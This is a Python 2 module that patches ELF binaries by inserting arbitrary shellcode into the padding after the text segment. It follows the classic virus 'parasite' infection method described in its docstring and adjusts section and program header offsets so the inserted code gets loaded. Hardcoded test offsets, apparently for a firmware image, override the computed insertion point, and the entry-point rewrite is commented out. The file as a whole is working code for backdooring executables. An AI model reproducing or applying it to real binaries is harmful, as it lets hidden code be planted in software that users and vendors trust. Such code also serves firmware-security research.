import struct
import os
import sys
import shutil
from elf_helper import *
from elfbin import elfbin

class elfpatch():
    def __init__(self, FILE, OUTPUT,SHELLCODE,OBJECT_FILE):
        self.FILE = FILE
        self.OUTPUT = OUTPUT
        self.bin_file = open(self.FILE, "r+b")
        self.SHELLCODE = SHELLCODE
        self.OBJECT_FILE = OBJECT_FILE
        self.elfbin = elfbin(self.FILE)
    
    def patch_elf(self):
        '''
        Circa 1998: http://vxheavens.com/lib/vsc01.html  <--Thanks to elfmaster
        6. Increase p_shoff by PAGE_SIZE in the ELF header
        7. Patch the insertion code (parasite) to jump to the entry point (original)
        1. Locate the text segment program header
            -Modify the entry point of the ELF header to point to the new code (p_vaddr + p_filesz)
            -Increase p_filesz by account for the new code (parasite)
            -Increase p_memsz to account for the new code (parasite)
        2. For each phdr who's segment is after the insertion (text segment)
            -increase p_offset by PAGE_SIZE
        3. For the last shdr in the text segment
            -increase sh_len by the parasite length
        4. For each shdr who's section resides after the insertion
            -Increase sh_offset by PAGE_SIZE
        5. Physically insert the new code (parasite) and pad to PAGE_SIZE,
            into the file - text segment p_offset + p_filesz (original)
        '''
        shutil.copy2(self.FILE, self.OUTPUT)
        print "[*] Patching Binary"
        self.bin_file = open(self.OUTPUT, "r+b")

        if not self.OBJECT_FILE:
          shellcode = to_binary_code(self.SHELLCODE)
        else:
          shellcode = to_binary_code(get_text_section(self.OBJECT_FILE))
        newBuffer = len(shellcode)
        self.bin_file.seek(24, 0)

        sh_addr = 0x0
        offsetHold = 0x0
        sizeOfSegment = 0x0
        shellcode_vaddr = 0x0
        headerTracker = 0x0
        PAGE_SIZE = 4096
        #find range of the first PT_LOAD section
        for header, values in self.elfbin.prog_hdr.iteritems():
            #print 'program header', header, values
            '''vxworks image text and data in a single segment '''
            #if values['p_flags'] == 0x5 and values['p_type'] == 0x1:
            if values['p_type'] == 0x1:
                print "[+] Found text segment"
                shellcode_vaddr = values['p_vaddr'] + values['p_filesz']
                oldentry = self.elfbin.e_entry
                headerTracker = header
                newOffset = values['p_offset'] + values['p_filesz']
                break
        # Note: noly for test
        shellcode_vaddr = 0x00308000 + 0xce186
        newOffset = 0x000060 + 0xce186
        #SPLIT THE FILE
        self.bin_file.seek(0)
        file_1st_part = self.bin_file.read(newOffset)
        #print file_1st_part.encode('hex')
        newSectionOffset = self.bin_file.tell()
        file_2nd_part = self.bin_file.read()

        self.bin_file.close()
        #print "Reopen file for adjustments"
        self.bin_file = open(self.OUTPUT, "w+b")
        self.bin_file.write(file_1st_part)
        self.bin_file.write(shellcode)
        self.bin_file.write("\x00" * (PAGE_SIZE - len(shellcode)))
        self.bin_file.write(file_2nd_part)
        if self.elfbin.EI_CLASS == 0x01:
            #32 bit FILE
            #update section header table
            self.bin_file.seek(24, 0)
            self.bin_file.seek(8, 1)
            self.bin_file.write(struct.pack(self.elfbin.endian + "I", self.elfbin.e_shoff + PAGE_SIZE))
            self.bin_file.seek(self.elfbin.e_shoff + PAGE_SIZE, 0)
            for i in range(self.elfbin.e_shnum):
                #print "i", i, self.sec_hdr[i]['sh_offset'], newOffset
                if self.elfbin.sec_hdr[i]['sh_offset'] >= newOffset:
                    #print "Adding page size"
                    self.bin_file.seek(16, 1)
                    self.bin_file.write(struct.pack(self.elfbin.endian + "I", self.elfbin.sec_hdr[i]['sh_offset'] + PAGE_SIZE))
                    self.bin_file.seek(20, 1)
                elif self.elfbin.sec_hdr[i]['sh_size'] + self.elfbin.sec_hdr[i]['sh_addr'] == shellcode_vaddr:
                    #print "adding newBuffer size"
                    self.bin_file.seek(20, 1)
                    self.bin_file.write(struct.pack(self.elfbin.endian + "I", self.elfbin.sec_hdr[i]['sh_size'] + newBuffer))
                    self.bin_file.seek(16, 1)
                else:
                    self.bin_file.seek(40,1)
            #update the pointer to the section header table
            after_textSegment = False
            self.bin_file.seek(self.elfbin.e_phoff,0)
            for i in range(self.elfbin.e_phnum):
                #print "header range i", i
                #print "shellcode_vaddr", hex(self.prog_hdr[i]['p_vaddr']), hex(shellcode_vaddr)
                if i == headerTracker:
                    #print "Found Text Segment again"
                    after_textSegment = True
                    self.bin_file.seek(16, 1)
                    self.bin_file.write(struct.pack(self.elfbin.endian + "I", self.elfbin.prog_hdr[i]['p_filesz'] + newBuffer))
                    self.bin_file.write(struct.pack(self.elfbin.endian + "I", self.elfbin.prog_hdr[i]['p_memsz'] + newBuffer))
                    self.bin_file.seek(8, 1)
                elif after_textSegment is True:
                    #print "Increasing headers after the addition"
                    self.bin_file.seek(4, 1)
                    self.bin_file.write(struct.pack(self.elfbin.endian + "I", self.elfbin.prog_hdr[i]['p_offset'] + PAGE_SIZE))
                    self.bin_file.seek(24, 1)
                else:
                    self.bin_file.seek(32,1)

            # we don't need fix the entry point
            #self.bin_file.seek(self.elfbin.e_entryLocOnDisk, 0)
            #self.bin_file.write(struct.pack(self.elfbin.endian + "I", shellcode_vaddr))

        self.bin_file.close()
        print "[!] Patching Complete"
        return (oldentry,shellcode_vaddr)

